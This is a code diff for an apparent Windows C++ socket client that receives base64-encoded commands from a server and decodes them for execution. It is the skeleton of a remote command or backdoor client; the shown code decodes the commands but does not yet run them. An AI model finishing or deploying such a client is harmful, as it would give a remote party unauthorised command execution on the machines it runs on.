@@ -1,6 +1,9 @@
 #include <iostream>
 #include <string>
 #include <vector>
+#include <sstream>
+#include <algorithm>
+#include <iterator>
 #include <WS2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
@@ -9,7 +12,7 @@ using namespace std;
 
 typedef unsigned char uchar;             // Custom Data Type
 const string TARGETIP = "127.0.0.1";      // SERVER Ip Address
-const int    TARGETPO = 54000;          // SERVER Port Number
+const int    TARGETPO = 54000;          // SERVER Port Numbe
 
 // Some Extended Methods for String
 class STRINGER{
@@ -24,6 +27,14 @@ public:
 		size_t pos = upper.find(lower);
 		if (pos != std::string::npos){
 			upper.erase(pos, lower.length());
+		}
+	}
+	template <class Container>
+	void split(const std::string& str, Container& cont, char delim = ' '){
+		std::stringstream ss(str);
+		std::string token;
+		while (std::getline(ss, token, delim)) {
+			cont.push_back(token);
 		}
 	}
 	string base64_encode(const std::string &in){
@@ -170,10 +181,19 @@ public:
 		return converter;
 	}
 	void execute(string command){
+		string toexecute;
 		if (command.find(":") != string::npos){  // Command Prompt
-			
+			vector<string> values;
+			stringer.split(command, values, ':');
+			if (values.size() >= 2){
+				if (stringer.base64_decode(values[0]) == "true"){
+					toexecute = stringer.base64_decode(values[1]);
+				}else{
+					cout << "Received False in Command Prompt" << endl;
+				}
+			}
 		}else{                                   // Silly Prompt
-		
+			toexecute = stringer.base64_decode(command);
 		}
 	}
 	bool launch(){
